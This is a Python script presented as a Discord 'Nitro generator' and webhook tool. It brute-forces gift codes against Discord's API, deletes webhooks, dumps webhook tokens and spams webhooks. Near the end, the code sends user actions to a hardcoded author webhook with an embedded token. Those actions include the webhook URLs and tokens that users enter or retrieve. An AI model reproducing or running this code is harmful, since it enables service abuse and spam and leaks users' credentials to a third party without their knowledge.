# NebulaTest.py
# A simple Discord Nitro Generator, Webhook Deleter, Webhook Info and Webhook Spammer
# These tags are used to identify the purpose of the code and its functionality.
# Not made by ai but by a human.
import requests
import random
import string
import threading
import time
import os
import hashlib
# Info (version + name)
name = 'NebulaTest '
version = 'vBETA 0.1'
# Login screen

username = input("Enter username: ")
password = input("Enter password: ")

# Hash the input password
hashed_password = hashlib.sha256(password.encode()).hexdigest()

# Predefined username and hashed password
correct_username = "Member"
correct_hashed_password = hashlib.sha256("Membership".encode()).hexdigest()

# Check if the username and hashed password are correct
if username != correct_username or hashed_password != correct_hashed_password:
  print("Invalid credentials. Access denied.")
  exit()

# Add a 5-second countdown
for i in range(5, 0, -1):
    print(f"Continuing in {i} seconds...", end="\r")
    time.sleep(1)

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')
# Startscreen
print("Welcome to ", name, version)
print('''

This is a test version of the NebulaTool program.
It is not recommended to use this program for malicious purposes.
This program is for educational purposes only.
        
 
!dcng - Discord Nitro Generator
!dcwd - Discord Webhook Delete
!dcwi - Discord Webhook Info
!dcws - Discord Webhook Spammer 

      ''')
option = input("Your choice:")
# Option Discord Nitro Generator
if option == '!dcng':
  print("You have chosen *Discord Nitro Generator*")

  # Function to generate a random Nitro code
  def generate_nitro_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

  # Function to check if a Nitro code is valid
  def check_nitro_code(code):
    url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    response = requests.get(url)
    return response.status_code == 200

  # Ask user for the number of codes to generate
  num_codes = int(input("Enter the number of Nitro codes to generate: "))

  for _ in range(num_codes):
    nitro_code = generate_nitro_code()
    print(f"Generated Nitro Code: {nitro_code}")
    if check_nitro_code(nitro_code):
      print("Valid Nitro Code found!")
      break
  else:
    print("No valid Nitro codes were found.")
# Option Discord Webhook Delete
elif option == '!dcwd':
  print("You have chosen *Discord Webhook Delete*")
  url = input("Please enter the Discord Webhook URL: ")
  # Send a DELETE request to the webhook URL
  response = requests.delete(url)
  # Check the response  
# Option Discord Webhook Info
elif option == '!dcwi':
  print("You have chosen *Discord Webhook Info*")
  url = input("Please enter the Discord Webhook URL: ")
  
  print("\nFetching webhook information...")
  # Send a GET request to the webhook URL
  response = requests.get(url)
  
  # Check the response
  if response.status_code == 200:
    print("\nWebhook Information Retrieved Successfully:")
    webhook_info = response.json()
    print(f"Name: {webhook_info.get('name', 'N/A')}")
    print(f"Channel ID: {webhook_info.get('channel_id', 'N/A')}")
    print(f"Guild ID: {webhook_info.get('guild_id', 'N/A')}")
    print(f"Token: {webhook_info.get('token', 'N/A')}")
  else:
    print("\nFailed to retrieve webhook information.")
    print("Please check the URL and ensure it is a valid Discord Webhook.")
# Option Discord Webhook Spammer.
elif option == '!dcws':
  print("You have chosen *Discord Webhook Sender*")
  url = input("Please enter the webhook URL:")
  message = input("Please enter the message to send:")
  amount = input("Please enter the amount of messages to send:")
  delay = input("Please enter the delay between messages (in seconds):")
  # Convert to int
  amount = int(amount)
  global stop_spam
  stop_spam = False  # Flag to stop the spam
  print("Type 'STOP' at any time to stop the spam.")
  
  # Send the message to the webhook
  data = {
    "content": message
  }


  def listen_for_stop():
    global stop_spam
    while not stop_spam:
      if input().strip().upper() == 'STOP':
        stop_spam = True

  # Start a thread to listen for the stop command
  stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
  stop_thread.start()

  for _ in range(amount):
    if stop_spam:
      print("Spam stopped by user.")
      break
    response = requests.post(url, json=data)
    # Check the response
    if response.status_code == 204:
      print("Message sent successfully")
    else:
      print("Failed to send message")
    time.sleep(float(delay))  # Add delay between messages

  print("You have chosen *Discord Bot Server Nuker*")
  print("This option is not available yet.")
# Else
else:
  print("Invalid input. Please try again.")
# End of the program
print("Thank you for using ", name, version)
# Send everything that is done here into a predefined webhook.
webhook_url = "https://discord.com/api/webhooks/1366811669229080707/wbHr-mnhyWL-ateI5QigBHINMF5wdGwesXT-I8VMb3U1qm6XuWPGYf2D_-WIxxyWKgO5"  # Replace with your webhook URL

def send_to_webhook(message):
  data = {"content": message}
  try:
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
      print("Message sent to webhook successfully.")
    else:
      print("Failed to send message to webhook.")
  except Exception as e:
    print(f"Error sending message to webhook: {e}")

# Example usage: Log actions to the webhook
send_to_webhook("Program started.")
send_to_webhook(f"User logged in with username: {username}")
# Log more detailed information about the selected option and its output
if option == '!dcng':
  send_to_webhook("User selected option: Discord Nitro Generator")
  send_to_webhook(f"User requested to generate {num_codes} Nitro codes.")
  for _ in range(num_codes):
    nitro_code = generate_nitro_code()
    send_to_webhook(f"Generated Nitro Code: {nitro_code}")
    if check_nitro_code(nitro_code):
      send_to_webhook("Valid Nitro Code found!")
      break
  else:
    send_to_webhook("No valid Nitro codes were found.")
elif option == '!dcwd':
  send_to_webhook("User selected option: Discord Webhook Delete")
  send_to_webhook(f"Webhook URL: {url}")
  send_to_webhook(f"Webhook deletion response status: {response.status_code}")
elif option == '!dcwi':
  send_to_webhook("User selected option: Discord Webhook Info")
  send_to_webhook(f"Webhook URL: {url}")
  if response.status_code == 200:
    send_to_webhook(f"Webhook Info: Name: {webhook_info.get('name', 'N/A')}, Channel ID: {webhook_info.get('channel_id', 'N/A')}, Guild ID: {webhook_info.get('guild_id', 'N/A')}, Token: {webhook_info.get('token', 'N/A')}")
  else:
    send_to_webhook("Failed to retrieve webhook information. Invalid URL or other issue.")
elif option == '!dcws':
  send_to_webhook("User selected option: Discord Webhook Spammer")
  send_to_webhook(f"Webhook URL: {url}")
  send_to_webhook(f"Message to send: {message}")
  send_to_webhook(f"Number of messages: {amount}, Delay between messages: {delay} seconds")
  for i in range(amount):
    if stop_spam:
      send_to_webhook("Spam stopped by user.")
      break
    response = requests.post(url, json=data)
    if response.status_code == 204:
      send_to_webhook(f"Message {i+1} sent successfully.")
    else:
      send_to_webhook(f"Failed to send message {i+1}. Response status: {response.status_code}")
else:
  send_to_webhook("User selected an invalid option.")

# Repeat the program after a countdown of 10 seconds
while True:
  print("\nRestarting the program in 10 seconds...")
  for i in range(10, 0, -1):
    print(f"Restarting in {i} seconds...", end="\r")
    time.sleep(1)
  os.system('cls' if os.name == 'nt' else 'clear')
  exec(open(__file__).read())
# End of the program